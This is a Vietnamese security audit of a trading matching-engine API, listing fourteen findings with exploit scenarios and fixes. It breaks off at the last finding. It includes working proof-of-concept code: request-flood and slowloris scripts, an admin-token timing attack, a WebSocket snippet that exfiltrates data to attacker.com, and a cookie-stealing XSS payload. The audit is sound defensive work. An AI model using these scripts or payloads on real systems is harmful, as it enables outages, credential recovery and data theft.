# Security Report — Security Engineer
**Role:** Security Engineer — Adversarial review of matching engine HTTP/WS API
**Phương pháp:** Threat modeling (STRIDE), authorization review, IDOR enumeration, race-condition analysis, input fuzzing, CORS & DoS surface mapping
**Nguyên tắc:** Mọi finding đều có exploit scenario cụ thể và điều kiện trigger rõ ràng. Chain các vuln với nhau khi relevant.

---

## Threat Model Summary

Hệ thống là một **matching engine không có user identity**: không có login, session, API key, hay user namespace. Mọi endpoint HTTP (`/api/orders`, `/api/cancel`, `/api/state`, `/ws`) được expose cho anonymous caller. Chỉ `/api/reset` được bảo vệ bằng `X-Admin-Token`.

Vì không có user context, mọi vuln về **authorization** thực chất là vuln của **hệ thống design**: không có khái niệm "order của user nào" để kiểm soát. Report này treat mỗi client như một actor riêng biệt và đánh giá mức độ mà một client có thể gây hại cho client khác.

---

## Tổng quan Findings

| ID | Tên | Category | Severity |
|----|-----|----------|----------|
| SEC-01 | Cancel bất kỳ order nào của người khác (No Authorization) | IDOR / AuthZ | **CRITICAL** |
| SEC-02 | Order-ID spoofing → dedup DoS + impersonation | AuthZ / IDOR | **HIGH** |
| SEC-03 | Client-controlled timestamp → Price-Time Priority bypass | Input Validation / Race | **HIGH** |
| SEC-04 | Full order book + active order IDs disclosure | Information Disclosure | **HIGH** |
| SEC-05 | CORS wildcard + no auth → cross-origin trade từ browser victim | CSRF / CORS | **HIGH** |
| SEC-06 | `NaN` / `Infinity` price bypass validation | Input Validation | **HIGH** |
| SEC-07 | Order flood → unbounded book → OOM / CPU DoS | DoS / Resource Limit | **HIGH** |
| SEC-08 | Slow WebSocket client → đóng băng toàn bộ place_order | DoS / Availability | **HIGH** |
| SEC-09 | Trade-history pushout attack (evict evidence khỏi deque) | Integrity / Audit | **HIGH** |
| SEC-10 | Admin token so sánh không constant-time → timing leak | Privilege Escalation | **MEDIUM** |
| SEC-11 | WebSocket không check `Origin` → cross-site eavesdropping | Confidentiality | **MEDIUM** |
| SEC-12 | Unbounded `order_id` length / charset → memory bloat + render XSS downstream | Input Validation | **MEDIUM** |
| SEC-13 | Không có quantity cap → int overflow behavior / extreme values | Input Validation | **MEDIUM** |
| SEC-14 | Cancel status code oracle → order ID enumeration (latent nếu SEC-04 fixed) | Information Disclosure | **LOW** |

---

---

## SEC-01 — Cancel Bất Kỳ Order Nào Của Người Khác (IDOR)

### Mô tả chi tiết
Endpoint `POST /api/cancel` nhận `order_id` và hủy order tương ứng **không có bất kỳ kiểm tra ownership nào**. Vì hệ thống không có user identity, server không biết ai là "chủ" của order. Kết hợp với `GET /api/state` trả về toàn bộ active orders cùng `order_id` của chúng (SEC-04), attacker có công cụ enumeration hoàn hảo: đọc state → lấy ID của lệnh nạn nhân → cancel nó.

Đây là **IDOR thuần túy**: object (`Order`) được tham chiếu trực tiếp qua ID client-supplied, không có ACL.

### Khi nào xảy ra
- Bất kỳ lúc nào có ≥1 order của bất kỳ trader nào trên sổ
- Attacker có thể reach endpoint `/api/cancel` (cùng network, internet, hoặc qua victim's browser bằng SEC-05)

### Điều kiện kết hợp
- Không yêu cầu auth → điều kiện trivial
- `order_id` không có namespace theo user
- `/api/state` (hoặc WS broadcast) disclose toàn bộ ID

### Kịch bản tái hiện (Step-by-step)

```
Setup:
  Victim V đặt một resting BUY: {"side":"BUY","quantity":1000,"price":100.0,"order_id":"V-BIG-ORDER"}
  → V hy vọng mua giá thấp khi thị trường down.

Bước 1 (Reconnaissance):
  Attacker A → GET /api/state
  Response: { ..., "buys":[{"order_id":"V-BIG-ORDER", "remaining":1000, "price":100.0, ...}] }
  → A biết chính xác ID order của V.

Bước 2 (Exploit):
  Attacker A → POST /api/cancel
  Body: {"order_id":"V-BIG-ORDER"}
  Response: {"ok":true, "state":{...}}

Bước 3 (Impact):
  Thị trường flash crash xuống 80 → V lẽ ra được fill tại 100,
  nhưng order đã bị A hủy từ trước. V mất cơ hội trade.

Variation (market manipulation):
  A làm việc này hàng loạt ngay trước một pump/dump tự lên kế hoạch:
  → hủy hết BUY wall → đẩy giá xuống sâu hơn, A mua đáy.
```

### Impact
- **Financial loss trực tiếp** cho victim (lost opportunity / stop-loss triggering).
- **Market manipulation**: attacker có thể wipe liquidity walls trước khi đánh hướng.
- **Audit vô dụng**: không có log ai cancel cái gì.

**Severity: CRITICAL** — phá vỡ integrity cơ bản của exchange, exploit trivial, không cần condition đặc biệt.

### Fix đề xuất
1. Thêm layer authentication (API key / JWT) → gắn `user_id` vào mỗi order khi tạo.
2. `cancel()` verify `order.user_id == request.user_id` trước khi xóa.
3. `/api/state` chỉ trả order IDs của chính caller (aggregated levels cho phần còn lại).

---

---

## SEC-02 — Order-ID Spoofing → Dedup DoS + Impersonation

### Mô tả chi tiết
Client cung cấp `order_id` trong payload. Server **không kiểm tra charset, uniqueness per-user, hay reservation**. Kết hợp với BUG-03 fix (`_rest()` reject duplicate `order_id`), attacker có thể **pre-allocate** các ID mà nạn nhân dự kiến dùng → khi victim submit với cùng ID, submit bị silently rejected vì dedup.

Đây là **DoS có chủ đích** + **impersonation**: trade log sẽ ghi nhận ID "victim" do attacker trade, gây confusion trong reconciliation.

### Khi nào xảy ra
- Attacker biết (hoặc đoán được) ID convention của victim (ví dụ `B-client123-001`, sequential)
- Victim dùng client-supplied `order_id` thay vì để server auto-generate
- Attacker submit trước victim

### Điều kiện kết hợp
- `order_id` được client-controlled **không** có user-namespace
- `_rest()` dedup theo `order_id` string thuần (không theo (user_id, order_id))
- Không có rate limit → attacker spam được

### Kịch bản tái hiện (Step-by-step)

```
Assumption: Victim sử dụng naming convention "V-ORD-<seq>" (có thể học qua SEC-04).

Bước 1 (Squat):
  Attacker A → POST /api/orders
  Body: {"side":"BUY","quantity":1,"price":0.01,"order_id":"V-ORD-42","timestamp":1}
  → A đặt một dummy order với ID mà V sắp dùng.

Bước 2 (Victim bị block):
  V → POST /api/orders
  Body: {"side":"BUY","quantity":1000,"price":99.0,"order_id":"V-ORD-42","timestamp":2}
  Internally:
    order_book.submit(...)
      → không khớp (giá khác)
      → _rest() thấy "V-ORD-42" đã tồn tại trên sổ → RETURN, không thêm gì
  HTTP Response: {"ok":true, "trades":[], "state":{...}}
  → V tưởng order đã rest thành công, nhưng KHÔNG có gì trong sổ (của V).
  → Market đi đúng hướng V dự đoán, nhưng V không được fill.

Bước 3 (Impersonation):
  A cancel "V-ORD-42" của mình bất kỳ lúc nào.
  Trade log của A ghi nhận "V-ORD-42 cancelled" — trong sổ audit
  trông như V đã cancel order của mình.

Variation (partial-fill griefing):
  A đặt order "V-ORD-42" ở giá ĐÚNG market → bị khớp ngay → V tưởng
  mình đã trade nhưng thực tế là A. P&L mismatch.
```

### Impact
- **Silent order-drop DoS**: victim nghĩ order đã vào sổ nhưng thực tế bị ignore.
- **Impersonation/repudiation**: attacker có thể tạo trade "thay mặt" victim.
- **Audit confusion**: không thể phân biệt order của A và V qua ID.

**Severity: HIGH** — exploit yêu cầu đoán ID convention nhưng ID convention thường predictable.

### Fix đề xuất
1. Luôn auto-generate `order_id` ở server (như UUID fix của BUG-11).
2. Nếu cho phép client-id, namespace: `{user_id}:{client_id}` ở storage key.
3. Reject submit thứ 2 bằng 409 Conflict thay vì silent ignore.

---

---

## SEC-03 — Client-Controlled Timestamp → Price-Time Priority Bypass

### Mô tả chi tiết
```python
# web.py:116
timestamp = int(payload.get("timestamp") or time.time() * 1000)
```
Nếu client gửi `"timestamp": 0` (hoặc bất kỳ số âm), server dùng giá trị đó làm ưu tiên FIFO. Vì sort theo `(−price, timestamp)` ascending, timestamp nhỏ → đứng đầu queue cùng price level. Attacker luôn jump lên đầu queue bằng `timestamp=-2147483648`.

Đây là **unfair trading advantage** và vi phạm trực tiếp SEC rules của một exchange thực.

### Khi nào xảy ra
- Attacker đặt order vào cùng price level với resting orders khác
- Payload có field `timestamp` với giá trị < `time.time() * 1000`
- Một aggressor order đến và cần fill theo FIFO ở mức giá đó

### Điều kiện kết hợp
- Server chấp nhận timestamp từ client (không override)
- Không validate `timestamp >= server_now`
- Có cạnh tranh FIFO (≥2 orders cùng giá)

### Kịch bản tái hiện (Step-by-step)

```
Bước 1: Trader V đặt BUY @100.0 trước:
  V → {"side":"BUY","quantity":5,"price":100.0,"order_id":"V1"}
  server gán timestamp = now_ms (ví dụ 1700000000000)

Bước 2: Attacker A submit sau nhưng với timestamp giả:
  A → {"side":"BUY","quantity":5,"price":100.0,"order_id":"A1","timestamp":0}
  → buys sau sort: [A1(ts=0), V1(ts=1700000000000)]
  → A1 đứng ĐẦU queue dù đến SAU.

Bước 3: SELL @100 đến, chỉ đủ fill 1 order:
  X → {"side":"SELL","quantity":5,"price":100.0}
  → khớp A1 trước V1.
  → A đã "cướp" trade của V.

Bước 4: Nếu market tiếp tục down, V không được fill nữa → loss opportunity.

Extreme: A gửi timestamp = -9999999999 → đảm bảo luôn đứng đầu
         bất kể bao nhiêu order đến sau.
```

### Impact
- **Unfair queue position**: HFT attacker luôn thắng FIFO.
- **Market abuse**: regulatory violation (NBBO rules, best execution).
- **Trust violation**: Price-Time Priority là invariant cốt lõi của matching engine.

**Severity: HIGH** — trực tiếp cho phép market manipulation; exploit trivial (1 field trong payload).

### Fix đề xuất
```python
# Timestamp LUÔN do server gán, không nhận từ client:
timestamp = int(time.time() * 1000)
# Xóa payload.get("timestamp") fallback hoàn toàn.
```

---

---

## SEC-04 — Full Order Book + Active Order IDs Disclosure

### Mô tả chi tiết
`GET /api/state` và tất cả WS broadcasts trả về:
- Mọi order với **full order_id**, quantity, remaining, price, timestamp
- Full trade history (tối đa MAX_TRADES trades)
- `active_orders` — list mọi order còn sống

Một exchange thực expose **aggregated book levels** (price + total qty ở mỗi level), không expose ID cá nhân của từng order. Việc disclose ID là **điều kiện cần** cho SEC-01 (cancel IDOR) và SEC-02 (ID squatting).

### Khi nào xảy ra
- Bất kỳ client nào (anonymous) gọi `GET /api/state` hoặc subscribe `/ws`

### Điều kiện kết hợp
- `snapshot()` serialize `order_id` qua `asdict(order)` → mọi field lộ ra
- `active_orders()` cũng expose tất cả
- Broadcast dùng cùng `state()` → mọi WS client thấy tất cả order của mọi trader

### Kịch bản tái hiện (Step-by-step)

```
Bước 1: Attacker connect WS:
  ws://server/ws
  → Nhận event "connected" với state chứa mọi resting order.

Bước 2: Theo dõi real-time:
  Mỗi lần có order_placed / order_cancelled → A nhận full state mới.
  → A xây dựng market-microstructure picture đầy đủ về mọi participant.

Bước 3 (chained với SEC-01):
  A thấy "WHALE-BUY-001" @99.5 qty=10000.
  A POST /api/cancel {"order_id":"WHALE-BUY-001"}
  → Wipe liquidity.

Bước 4 (chained với SEC-03):
  A biết queue order tại mỗi price level → chạy timestamp attack
  chính xác vào các price levels mà A muốn chiếm đầu queue.
```

### Impact
- **Confidentiality breach**: trading strategies, position sizes, timings của mọi trader lộ ra.
- **Enabler** cho SEC-01, SEC-02, SEC-03.
- **Competitive harm**: HFT có thể front-run dựa trên order IDs.

**Severity: HIGH** — thông tin đắt giá trong bối cảnh trading; bản thân nó là vuln và amplify các vuln khác.

### Fix đề xuất
- Trả về **aggregated book**: `[{price: 100.0, total_qty: 500}, ...]`.
- `order_id` chỉ visible cho owner (qua `GET /api/my_orders` authed).
- WS broadcast chỉ gửi aggregated deltas, không gửi IDs.

---

---

## SEC-05 — CORS `*` + No Auth → Cross-Origin Trade Từ Browser Của Victim

### Mô tả chi tiết
```python
CORS_HEADERS = {
    "Access-Control-Allow-Origin": "*",
    ...
}
```
Kết hợp với việc API không có auth header requirement, **bất kỳ website nào** cũng có thể gửi POST từ trình duyệt của victim (khi victim visit site đó). Trình duyệt **sẽ** gửi request vì:
1. `Content-Type: application/json` là "non-simple" → triggers preflight.
2. Preflight OPTIONS được server whitelist với CORS `*`.
3. Browser thực hiện POST thật sự.

Nếu tương lai auth được add qua cookie, đây là **CSRF tiêu chuẩn**. Hiện tại không có auth nên browser-as-proxy là ảnh hưởng duy nhất, nhưng vẫn **dangerous**: attacker dùng browser victim như anonymizing proxy để submit orders mà victim không biết (IP của victim trong log).

### Khi nào xảy ra
- Victim mở một webpage malicious (phishing, comment section XSS, v.v.)
- JS trên page đó fetch API của matching engine
- Request được gửi với IP/geolocation của victim

### Điều kiện kết hợp
- `Access-Control-Allow-Origin: *`
- `Access-Control-Allow-Methods: GET,POST,OPTIONS`
- API không require `Authorization` header hoặc CSRF token
- Victim có network reach tới matching engine (LAN / internet)

### Kịch bản tái hiện (Step-by-step)

```html
<!-- attacker.com/evil.html -->
<script>
fetch("http://matching-engine.internal:8000/api/orders", {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify({
    side:"SELL", quantity:1000000, price:0.01, order_type:"LIMIT"
  })
}).then(r => r.json()).then(console.log);
// Victim browser gửi SELL 1M @0.01 → wipe sạch buy side tại mọi giá >= 0.01.
</script>
```

```
Bước 1: Attacker gửi phishing email với link đến attacker.com/evil.html.
Bước 2: Victim (là một trader hợp lệ trong corp network) click link.
Bước 3: Browser của Victim:
        - Preflight OPTIONS → 204 với CORS *
        - POST /api/orders → thành công
Bước 4: Order flood trong book. IP log: IP của Victim.
Bước 5: Admin thấy IP Victim spam → block Victim nhầm.
```

### Impact
- **Exchange dùng IP của victim làm proxy** → attribution sai, ban nhầm.
- **Market manipulation qua botnet browser** (phishing campaign hàng loạt victim).
- **CSRF-ready**: khi auth được add (cookie-based), toàn bộ attack vector vẫn tồn tại.

**Severity: HIGH** — đặc biệt nếu service được expose bên ngoài LAN.

### Fix đề xuất
1. CORS chỉ whitelist **origins cụ thể** (frontend URL), không dùng `*`.
2. Require custom header `X-API-Key` hoặc `Authorization: Bearer ...` → browser mặc định không gửi được cross-origin.
3. Nếu dùng cookie auth → `SameSite=Strict` + double-submit CSRF token.

---

---

## SEC-06 — `NaN` / `Infinity` Price Bypass Validation

### Mô tả chi tiết
```python
# web.py:120
price = float(payload["price"])
if price <= 0:
    return web.json_response({"ok": False, "error": "price must be positive"}, status=400)
```
Python `float()` **chấp nhận** các chuỗi: `"nan"`, `"NaN"`, `"inf"`, `"Infinity"`, `"-inf"`. Kiểm tra `price <= 0` với:
- `float("nan") <= 0` → **False** (NaN comparisons luôn False) → **pass validation**
- `float("inf") <= 0` → **False** → pass validation
- `float("-inf") <= 0` → True → rejected ✓

Engine layer cũng chỉ check `price < 0` → NaN và +Inf lọt hết.

### Khi nào xảy ra
- Payload có `"price":"NaN"` hoặc `"price":"Infinity"` (JSON technically invalid cho literal, nhưng JavaScript client có thể gửi `"Infinity"` string, hoặc attacker gửi thủ công).
- Thực tế aiohttp's json parser có thể hoặc không chấp nhận `NaN` literal không quoted. Với quoted string `"NaN"` → payload.get("price") trả string → `float("NaN") = nan` → bypass.

### Điều kiện kết hợp
- JSON parse cho phép (hoặc dùng string → float manual conversion)
- Validation chỉ check `<= 0`, không check `math.isnan` / `math.isinf`

### Kịch bản tái hiện (Step-by-step)

```
Bước 1 (NaN poisoning):
  A → POST /api/orders
  Body: {"side":"BUY","quantity":5,"price":"NaN","order_type":"LIMIT"}
  → float("NaN") = nan
  → nan <= 0 → False → pass validation
  → Order rest trong buys với price=nan

Bước 2:
  A → GET /api/state
  Response: {"buys":[{"price":NaN,...}]}
  → Nhiều JSON parser client-side crash trên NaN (JSON chuẩn không có NaN literal).
  → UI của mọi trader khác bị crash khi fetch state.

Bước 3 (Infinity exploit):
  A → POST /api/orders
  Body: {"side":"BUY","quantity":999,"price":"Infinity","order_type":"LIMIT"}
  → price = inf
  → inf <= 0 → False → pass
  → buys sort key: (-inf, ts) → A1 đứng ĐẦU buy book mãi mãi (giá cao nhất).

Bước 4:
  Any SELL đến: _is_match(SELL, A1): inf >= sell_price → True (match tất cả).
  → A sweep sạch sell side, trả tại "Infinity" nhưng thực tế trade_price = resting.price
  → A mua toàn bộ liquidity. Seller không biết counterparty "thật".

Bước 5 (cancel để lộ):
  A cancel A1 sau khi đã sweep → không dấu vết lỗi.

Chain với SEC-09:
  NaN trade trong deque → mọi trade sau đó chứa NaN → /api/state payload
  không serialize được hoặc crash mọi consumer.
```

### Impact
- **Service poisoning**: NaN trong state crash mọi client JSON parser.
- **Unlimited buying power**: `price=inf` khớp mọi sell → unlimited matching quyền lực.
- **Integrity**: trade history chứa NaN/Inf không bao giờ reproduce được.

**Severity: HIGH** — classic float-validation oversight; exploit one-shot.

### Fix đề xuất
```python
import math
price = float(payload["price"])
if not math.isfinite(price) or price <= 0:
    return web.json_response({"ok": False, "error": "price must be positive finite"}, status=400)
```

---

---

## SEC-07 — Order Flood → Unbounded Book → OOM / CPU DoS

### Mô tả chi tiết
`OrderBook.buys` và `sells` là `list[Order]` **không có maxlen**. Không có rate limit trên `/api/orders`. Attacker flood orders với prices khác nhau (không bao giờ khớp) → lists grow → `_sort_books()` gọi mỗi submit với O(N log N) cost → service degrade tuyến tính rồi OOM.

### Khi nào xảy ra
- Không có rate limit / connection limit
- Không có max-book-size enforcement
- Không có min-tick / price-banding

### Điều kiện kết hợp
- Attacker có bandwidth đủ gửi nhiều request
- Không có auth → không throttle per-user
- Engine chấp nhận mọi price > 0

### Kịch bản tái hiện (Step-by-step)

```python
# attacker.py
import asyncio, aiohttp

async def flood():
    async with aiohttp.ClientSession() as s:
        for i in range(1_000_000):
            asyncio.create_task(s.post("http://target:8000/api/orders", json={
                "side": "BUY",
                "quantity": 1,
                "price": 0.01 + i * 1e-9,  # mỗi order unique price, không match
                "order_type": "LIMIT"
            }))
            if i % 10000 == 0:
                await asyncio.sleep(0)  # yield

asyncio.run(flood())
```

```
Diễn biến:
  t=0s:   book size = 0
  t=10s:  book size = 100k  → sort cost ~ 100k*17 = 1.7M ops per submit
  t=60s:  book size = 600k  → sort cost ~ 600k*20 = 12M ops → mỗi POST >100ms
  t=120s: RAM ~10GB → OOM → service killed
  t=pre-OOM: mọi client lag, place_order timeout hàng loạt.
```

### Impact
- **Total service outage**: OOM kill.
- **Latency degradation** trước khi crash: legit traders timeout.
- **Cost amplification**: aiohttp worker block trên sort → thread starvation.

**Severity: HIGH** — classic lack of rate limiting + no size bounds.

### Fix đề xuất
1. Rate-limit per-IP: `aiohttp-ratelimiter` hoặc middleware token bucket.
2. Max book size: reject submit khi `len(book) >= MAX_BOOK` (ví dụ 50k).
3. Dùng `sortedcontainers.SortedList` thay vì resort list mỗi submit (O(log N) insert).
4. Min-tick enforcement: price phải là bội số của tick-size → giới hạn số price levels.

---

---

## SEC-08 — Slow WebSocket Client → Đóng Băng Toàn Bộ `place_order`

### Mô tả chi tiết
```python
# web.py:45-49
for client in list(self.clients):
    if client.closed:
        stale_clients.append(client)
        continue
    await client.send_json(payload)
```
`broadcast()` **serialize** send cho từng client. Nếu 1 client đọc chậm (TCP backpressure), `await client.send_json()` block đến khi send buffer trống. Mọi client sau đó bị chờ.

Tồi tệ hơn: `place_order` **await broadcast** trước khi return response → **place_order bị chặn** cho đến khi slow client xử lý xong. Attacker chỉ cần 1 WS client cố tình không đọc → toàn bộ order placement của mọi trader khác bị đóng băng.

### Khi nào xảy ra
- Attacker mở WS connection nhưng không consume messages (TCP window 0)
- Order placement happens anywhere in the system

### Điều kiện kết hợp
- Attacker có thể giữ 1 WS connection mở
- Server send kernel buffer fill up
- Không có per-client timeout/drop policy

### Kịch bản tái hiện (Step-by-step)

```python
# slow_client.py
import asyncio, aiohttp

async def slowloris_ws():
    async with aiohttp.ClientSession() as s:
        async with s.ws_connect("http://target:8000/ws") as ws:
            # Đọc 1 lần cho socket đi qua prepare
            await ws.receive()
            # Sau đó KHÔNG bao giờ đọc nữa — TCP buffer của server dồn lên.
            await asyncio.sleep(3600)

asyncio.run(slowloris_ws())
```

```
Diễn biến:
  t=0s:    Attacker connect WS.
  t=10s:   Một trader legit → POST /api/orders → broadcast() gọi
           → await client.send_json(attacker_ws) HANG (TCP buffer full).
  t=∞:     place_order không return. Client timeout.
  Scale:   Mỗi order placement subsequent → cũng hang
           (vì tất cả đi qua cùng broadcast → blocked).
  → TOÀN BỘ exchange ngừng process orders.
```

### Impact
- **Availability DoS**: 1 attacker với 1 WS connection làm sập exchange.
- **No recovery**: không có heartbeat-drop (có heartbeat=20 nhưng chỉ check keep-alive, không check write latency).

**Severity: HIGH** — amplification cực lớn (1 WS → toàn bộ system).

### Fix đề xuất
1. Broadcast với timeout per client:
```python
try:
    await asyncio.wait_for(client.send_json(payload), timeout=2.0)
except asyncio.TimeoutError:
    stale_clients.append(client)
```
2. Parallelize broadcast: `asyncio.gather(*[send(c) for c in clients], return_exceptions=True)`.
3. Fire-and-forget: không await broadcast trong place_order → `asyncio.create_task(hub.broadcast(...))`.
4. Per-client bounded queue: drop messages nếu queue full.

---

---

## SEC-09 — Trade-History Pushout Attack

### Mô tả chi tiết
BUG-09 fix dùng `deque(maxlen=MAX_TRADES=10000)`. Attacker flood 10k+ self-trades → **evict** toàn bộ trade history thật. Nếu trade history dùng cho audit / dispute resolution, attacker có thể **xóa bằng chứng** về một trade cụ thể bằng cách push-out.

### Khi nào xảy ra
- MAX_TRADES cap nhỏ so với throughput trading thực
- Không có persistent storage song song (deque là duy nhất)
- Không có auth → attacker tự trade được

### Điều kiện kết hợp
- Attacker tạo được >= MAX_TRADES trades nhanh hơn victim có thể dispute
- Không có off-chain log / DB backup

### Kịch bản tái hiện (Step-by-step)

```
Bước 1: Victim V thực hiện trade scandalous:
  V mua 1000 @100 từ counterparty X → trade T_evidence trong deque.

Bước 2: V muốn xóa dấu vết của T_evidence:
  V chạy script:
    for i in range(10_500):
        place BUY @50 qty=1
        place SELL @50 qty=1  # match ngay → 1 trade
  → 10,500 self-trades push T_evidence ra khỏi deque.

Bước 3: Auditor → GET /api/state → chỉ thấy 10,500 self-trades.
  → T_evidence đã biến mất hoàn toàn khỏi log runtime.

Bước 4: V claim "never happened" với chỉ bằng chứng là state hiện tại.
```

### Impact
- **Integrity / Audit**: trade log không trustworthy.
- **Regulatory**: vi phạm requirement giữ trade history cho các financial exchange.
- **Forensics**: không reproduce được incident.

**Severity: HIGH** — trực tiếp phá audit trail; đặc biệt nghiêm trọng trong financial context.

### Fix đề xuất
1. Persist trades ra DB / append-only log **ngoài** process memory.
2. deque chỉ là cache cho /api/state response; source of truth là DB.
3. Nếu keep in-memory: snapshot/checkpoint định kỳ ra disk.

---

---

## SEC-10 — Admin Token So Sánh Không Constant-Time → Timing Leak

### Mô tả chi tiết
```python
# web.py:165
if token != ADMIN_TOKEN:
    return web.json_response({"ok": False, "error": "unauthorized"}, status=401)
```
Python `!=` trên string **bail out sớm** khi char đầu khác → timing difference theo số char prefix đúng. Attacker đo latency của /api/reset với các token thử → từng char → byte-by-byte brute-force.

### Khi nào xảy ra
- `ADMIN_TOKEN` env var được set (không empty)
- Attacker có network access đủ stable để đo timing (< 1ms jitter)
- Không rate-limit trên /api/reset failures

### Điều kiện kết hợp
- Comparison non-constant-time
- Không có account lockout
- Network path stable (same LAN, hoặc local)

### Kịch bản tái hiện (Step-by-step)

```python
# timing_attack.py
import requests, time, statistics

def time_token(token):
    samples = []
    for _ in range(1000):
        t = time.perf_counter_ns()
        requests.post("http://target:8000/api/reset", headers={"X-Admin-Token": token})
        samples.append(time.perf_counter_ns() - t)
    return statistics.median(samples)

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
known_prefix = ""
for pos in range(64):
    best_char = max(alphabet, key=lambda c: time_token(known_prefix + c + "X" * 63))
    known_prefix += best_char
    print("Recovered so far:", known_prefix)
```

```
Bước 1: attacker baseline timing với token rỗng.
Bước 2: thử từng char ở pos 0 → char với timing cao nhất → correct first char.
Bước 3: lặp pos 1, 2, ... → recover full token trong O(N × alphabet_size × samples).
Bước 4: gọi /api/reset với full token → wipe sổ.
```

### Impact
- **Privilege escalation** → admin endpoint (reset wipes entire book + history).
- **Kết hợp SEC-09**: reset xóa sạch trade history chính thức.

**Severity: MEDIUM** — yêu cầu timing measurement quality; trong LAN dễ, qua internet khó hơn nhưng khả thi với nhiều samples.

### Fix đề xuất
```python
import hmac
if not hmac.compare_digest(token, ADMIN_TOKEN):
    return web.json_response({"ok": False, "error": "unauthorized"}, status=401)
```
Kết hợp rate-limit (5 failed attempts → 1 hour lockout).

---

---

## SEC-11 — WebSocket Không Check `Origin` → Cross-Site Eavesdropping

### Mô tả chi tiết
```python
async def websocket_handler(request: web.Request) -> web.WebSocketResponse:
    hub = request.app["hub"]
    socket = web.WebSocketResponse(heartbeat=20)
    await socket.prepare(request)   # ← không verify Origin
```
WebSocket protocol không áp dụng CORS cùng way như HTTP. Bất kỳ webpage nào (trình duyệt của victim đang visit) đều có thể mở WS đến server và **nhận mọi broadcast**. Do WS không có preflight, `Access-Control-Allow-Origin: *` không bảo vệ được.

### Khi nào xảy ra
- Victim visit attacker.com với JS mở WS tới matching engine
- Server reachable từ victim's network
- Server không check `Origin` header trong upgrade request

### Điều kiện kết hợp
- Không có `Origin` whitelist
- Không yêu cầu auth cho WS

### Kịch bản tái hiện (Step-by-step)

```html
<!-- attacker.com -->
<script>
const ws = new WebSocket("ws://matching-engine.internal:8000/ws");
ws.onmessage = (e) => {
  fetch("https://attacker.com/collect", {
    method: "POST", body: e.data
  });
};
// Exfiltrate mọi book state + trade event về server attacker.
</script>
```

```
Bước 1: Victim trader visit page attacker.com (phishing, malvertising).
Bước 2: Browser victim mở WS tới matching engine (cùng corp LAN).
Bước 3: Mọi broadcast (order_placed, trades) flow về attacker.com.
Bước 4: Attacker có real-time feed của exchange internal mà không cần
        access trực tiếp vào network.
```

### Impact
- **Real-time market surveillance** qua browser victim.
- **Chain** với SEC-04: attacker có full visibility.
- **Defense evasion**: không cần direct network access.

**Severity: MEDIUM** — tùy thuộc exposure; với internal exchange không-internet vẫn nguy hiểm do phishing.

### Fix đề xuất
```python
allowed_origins = {"https://frontend.exchange.com"}
origin = request.headers.get("Origin", "")
if origin not in allowed_origins:
    return web.Response(status=403)
await socket.prepare(request)
```

---

---

## SEC-12 — Unbounded `order_id` Length/Charset → Memory Bloat + Downstream XSS

### Mô tả chi tiết
`order_id` nhận string bất kỳ từ payload. Không validate:
- **Length**: attacker gửi `order_id = "A" * 10_000_000` (10MB) → mỗi resting order ngốn 10MB RAM.
- **Charset**: control chars, null bytes, newlines, HTML/JS → nếu frontend render unsanitized → stored XSS.
- **Unicode confusables**: `"B1"` vs `"В1"` (Cyrillic В) → admin nhầm khi dispute.

### Khi nào xảy ra
- Client-supplied `order_id` có nội dung malicious
- Frontend (`frontend/server.py` serves static) render order_id trực tiếp

### Điều kiện kết hợp
- Không có `len(order_id) <= MAX` check
- Không có regex validate `[A-Za-z0-9-_]+`
- Frontend không escape khi render

### Kịch bản tái hiện (Step-by-step)

```
Bước 1 (Memory bloat):
  A → POST /api/orders với order_id = "A"*5_000_000, quantity=1, price=0.01
  → Order rest: 5MB per order.
  → Submit 1000 orders → 5GB RAM → OOM.

Bước 2 (Stored XSS):
  A → POST /api/orders với order_id = "<script>fetch('//attacker/'+document.cookie)</script>"
  → /api/state trả order_id raw.
  → Admin dashboard render list orders → XSS execute trong context admin session.

Bước 3 (Unicode confusable impersonation):
  A đặt order với id "B1" (ASCII).
  Victim đặt order với id "В1" (Cyrillic B).
  Admin dispute: đọc log thấy 2 "B1" → nhầm.
```

### Impact
- **OOM** qua large IDs.
- **Stored XSS** nếu frontend không escape → admin takeover.
- **Audit confusion** via unicode.

**Severity: MEDIUM** — impact phụ thuộc frontend behavior.

### Fix đề xuất
```python
import re
ID_RE = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
if order_id and not ID_RE.match(order_id):
    return web.json_response({"ok": False, "error": "invalid order_id"}, status=400)
```

---

---

## SEC-13 — Không Có Quantity Cap → Extreme Values

### Mô tả chi tiết
```python
quantity = int(payload["quantity"])
if quantity <= 0:
    return ...
```
Check positive nhưng **không có upper bound**. `int()` Python hỗ trợ arbitrary precision → attacker gửi `"quantity": "9" * 1000` (1000-digit number). Không crash, nhưng:
- Arithmetic với bignum chậm → CPU DoS.
- `order.remaining -= matched` → subtract bignum → microsecond latency amplification.
- JSON serialize giá trị khổng lồ → kilobyte-level payload per order.

### Kịch bản tái hiện

```
Bước 1:
  A → POST /api/orders
  Body: {"side":"BUY","quantity": 10**500, "price":0.01, "order_type":"LIMIT"}
  (JSON chấp nhận int lớn arbitrary)
  → int("10**500") = 10^500 → pass positive check
  → Order rest với quantity khổng lồ

Bước 2:
  A → POST /api/orders {"side":"SELL","quantity":1,"price":0.01}
  → match 1 unit → order.remaining -= 1 (bignum arithmetic)
  → mỗi trade: bignum ops → micro-burn CPU.

Bước 3: JSON payload:
  /api/state trả order với quantity = 10^500 → string ~500 char per order.
  → Response payload ~MB.
```

### Impact
- **Memory/compute overhead** per operation.
- **Payload bloat** trong broadcasts.
- **Downstream integration bugs**: client library không handle bignum.

**Severity: MEDIUM** — subtle, cần dùng bignum explicit để trigger.

### Fix đề xuất
```python
MAX_QTY = 10**9
if not (0 < quantity <= MAX_QTY):
    return web.json_response({"ok": False, "error": "quantity out of range"}, status=400)
```

---

---

## SEC-14 — Cancel Status Code Oracle → Order ID Enumeration

### Mô tả chi tiết
```python
if cancelled:
    return web.json_response({"ok": True, ...})
return web.json_response({"ok": False, ...}, status=404)
```
Cancel trả 200 nếu order tồn tại, 404 nếu không. Attacker enumerate IDs: thử cancel `B1`, `B2`, ..., đọc status → biết ID nào tồn tại. Vuln này **redundant** với SEC-04 (vì /api/state đã lộ tất cả), nhưng sẽ trở thành **primary leak** nếu SEC-04 fixed mà cancel oracle không fix.

### Kịch bản tái hiện
```
for candidate_id in known_patterns():
    r = requests.post("/api/cancel", json={"order_id": candidate_id})
    if r.status_code == 200:
        log(f"Found and cancelled: {candidate_id}")
```

### Impact
